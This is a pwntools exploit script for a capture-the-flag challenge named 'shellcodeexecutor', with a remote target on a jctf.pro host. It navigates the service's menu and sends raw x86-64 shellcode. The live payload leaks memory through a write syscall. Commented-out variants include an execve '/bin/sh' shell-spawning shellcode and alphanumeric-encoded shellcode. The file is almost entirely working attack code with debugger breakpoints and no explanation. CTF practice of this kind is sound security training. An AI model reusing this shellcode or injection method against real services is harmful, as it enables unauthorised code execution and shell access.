from pwn import *

pwnable = './shellcodeexecutor'

elf = ELF(pwnable)
#libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

context(terminal=['tmux', 'new-window'])
#context(os = 'linux', arch = 'amd64')

context.log_level = 'DEBUG'

#setarch $(uname -m) -R /bin/bash
debug_set = ''

debug_set_1 = '''
        b *0x5555555556f8
        b *0x55555555537a
        b *0x555555555373
        b *0x5555555555ab
    '''

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_1)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    #p = process("./seethefile", env=env)
    #gdb.attach(p, debug_set_1)
    #p = gdb.debug(pwnable, "b *0x00005555555555ab")
    p = process(pwnable)
    gdb.attach(p, debug_set_1)
else:
    #p = process('./seethefile')
    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
    #p = process(pwnable)
    p = remote('shellcode-executor.nc.jctf.pro', 1337)


p.recvuntil(">")
p.sendline("2")
p.recvuntil(">")
p.sendline("1")
p.recvuntil(":")
#p.sendline("\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05")
#p.sendline("jZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c")
#p.sendline("\x6a\x47\x54\x59\x36\x48\x33\x31")
#p.sendline("\x48\x6b\x32\x22\x21")  #rsi
#p.sendline("\x48\x6b\x39\x20\x41")  #rdi
#p.sendline("\x6a\x7f\x54\x59\x36\x48\x33\x31\x48\x6b\x39\x7f\x41")  #THIS IS IT
#p.sendline("\x63\x30\x21")  #THIS IS IT
#p.sendline("\x6a\x00\x00\x00\x00\x00\x47\xF7\x63\x54\x59\x36\x48\x33\x31")  #THIS IS IT
#p.sendline("\x54\x58\x00\x00\x68\x63\xf7\x47\x00\x54\x59\x36\x48\x33\x31")  #THIS IS IT
p.sendline("\x56\x58\x00\x00\x48\x8d\x35\x75\x00\x00\x00\xba\x40\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xc3\x54\x68\x69\x73\x20")  #THIS IS IT
#p.sendline("\x56\x58\x00\x00\x48\x31\xff\x48\x8d\x35\x72\x00\x00\x00\xba\x15\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xc3\x54\x68\x69\x73\x20")  #THIS IS IT
#p.sendline("\x00\x00\x48\x31\xff\x48\x8d\x35\x72")  #THIS IS IT
#p.sendline(p64(0x0076358d48ff3148))
p.recvuntil(">")
p.sendline("3")
p.recvline()
p.recvline()
p.recvline()
p.recvline()

p.wait_for_close()
